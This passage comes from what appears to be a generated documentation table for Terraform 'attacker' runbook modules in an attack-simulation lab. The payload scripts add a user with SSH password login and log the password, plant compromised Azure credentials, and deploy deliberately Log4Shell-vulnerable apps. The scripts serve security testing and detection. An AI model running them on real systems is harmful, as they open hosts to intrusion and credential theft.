base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-ssh-user                                        | ./modules/runbook/deploy-ssh-user                    | runbook_deploy_ssh_user                          | context.azure.runbook.ssh_user                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_user&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;password&quot;: null,<br/>                    &quot;username&quot;: &quot;lou.caloozer&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals &amp;&amp;#35;123;<br/>    password = try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;password&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;,&quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? var&amp;#46;inputs&amp;&amp;#35;91;&quot;password&quot;&amp;&amp;#35;93; :  random&amp;&amp;#35;95;password&amp;#46;password&amp;#46;result<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&amp;&amp;#35;123;local&amp;#46;password&amp;&amp;#35;125;&quot;<br/>    echo &#x27;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;password&amp;&amp;#35;125;&#x27; &amp;#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&amp;&amp;#35;95;config&amp;#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&amp;&amp;#35;95;config&amp;#46;d/common&amp;#45;user&amp;#45;passwd&amp;#45;auth&amp;#46;conf &lt;&lt;&amp;#45;EOF <br/>    &amp;#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&amp;#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &#x27;We talked about this guys&amp;#46; No SSH for you&amp;#33;&#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&amp;&amp;#35;95;config&amp;#46;d/custom&amp;#45;user&amp;#45;passwd&amp;#45;auth&amp;#46;conf &lt;&lt;&amp;#45;EOF <br/>    Match User $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>        password = local&amp;#46;password<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;<br/><br/>resource &quot;random&amp;&amp;#35;95;password&quot; &quot;password&quot; &amp;&amp;#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&amp;&amp;#35;95;special = &quot;&amp;#33;&amp;#35;$%&amp;&amp;&amp;#35;42;&amp;&amp;#35;40;&amp;&amp;#35;41;&amp;#45;&amp;&amp;#35;95;=&amp;#43;&amp;&amp;#35;91;&amp;&amp;#35;93;&amp;&amp;#35;123;&amp;&amp;#35;125;&lt;&gt;:?&quot;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| attacker-azure-credentials                               | ./modules/runbook/deploy-azure-credentials           | runbook_deploy_secret_azure_credentials          | context.azure.runbook.azure_credentials                           | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;azure_credentials&quot;: {<br/>                    &quot;compromised_keys_user&quot;: null,<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-credentials           | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;az&quot;<br/>    azure&amp;&amp;#35;95;creds = var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;credentials&quot;&amp;&amp;#35;93;&amp;&amp;#35;91;var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;keys&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;#46;rendered<br/>    &amp;#35; AZURE&amp;&amp;#35;95;CLIENT&amp;&amp;#35;95;ID: The Application &amp;&amp;#35;40;client&amp;&amp;#35;41; ID of the service principal&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;CLIENT&amp;&amp;#35;95;SECRET: The client secret for the service principal&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;TENANT&amp;&amp;#35;95;ID: The Tenant ID associated with your Azure subscription&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;SUBSCRIPTION&amp;&amp;#35;95;ID: Your Azure Subscription ID&amp;#46;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Deploying azure credentials&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    mkdir &amp;#45;p ~/&amp;#46;azure<br/>    if &amp;&amp;#35;91;  &quot;$&amp;&amp;#35;123; local&amp;#46;azure&amp;&amp;#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &amp;&amp;#35;125;&quot; == &quot;true&quot; &amp;&amp;#35;93;; then<br/>      echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;azure&amp;&amp;#35;95;creds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; ~/&amp;#46;azure/my&amp;#46;azureauth<br/>      export AZURE&amp;&amp;#35;95;AUTH&amp;&amp;#35;95;LOCATION=~/&amp;#46;azure/my&amp;#46;azureauth<br/>    fi<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found &amp;#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found &amp;#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-vulnerable-docker-log4j-app                     | ./modules/runbook/deploy-docker-log4j-app            | runbook_deploy_docker_log4j_app                  | context.azure.runbook.vulnerable.docker.log4j_app                 | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;docker&quot;: {<br/>                        &quot;log4j_app&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals &amp;&amp;#35;123;<br/>    image = &quot;ghcr&amp;#46;io/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &amp;&amp;#35;96;sudo docker ps &amp;#124; grep $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;&amp;&amp;#35;96; &amp;&amp;#35;93;&amp;&amp;#35;93;; then docker stop $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;; fi<br/>        log &quot;$&amp;&amp;#35;40;echo &#x27;docker run &amp;#45;d &amp;#45;&amp;#45;name $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125; &amp;#45;v /tmp:/tmp &amp;#45;&amp;#45;rm &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;:8080 $&amp;&amp;#35;123;local&amp;#46;image&amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;&quot;<br/>        docker run &amp;#45;d &amp;#45;&amp;#45;name $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125; &amp;#45;v /tmp:/tmp &amp;#45;&amp;#45;rm &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;:8080 $&amp;&amp;#35;123;local&amp;#46;image&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &amp;#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| attacker-vulnerable-log4j-app                            | ./modules/runbook/deploy-log4j-app                   | runbook_deploy_log4j_app                         | context.azure.runbook.vulnerable.log4j_app                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;log4j_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals &amp;&amp;#35;123;<br/>    app&amp;&amp;#35;95;dir = &quot;/vuln&amp;#45;log4j&amp;#45;app&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    screen &amp;#45;wipe<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    <br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/><br/>    log &quot;creating local files&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;web&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; web&amp;#46;py<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;ldap&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip  &gt; ldap&amp;#46;py<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;requirements&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; requirements&amp;#46;txt<br/><br/>    &amp;#35; install java 8u131<br/>    log &quot;checking for jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#33; &amp;#45;d /usr/java/jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131/ &amp;&amp;#35;93;; then<br/>        log &quot;jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131 not found &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        wget &amp;#45;c &amp;#45;&amp;#45;header 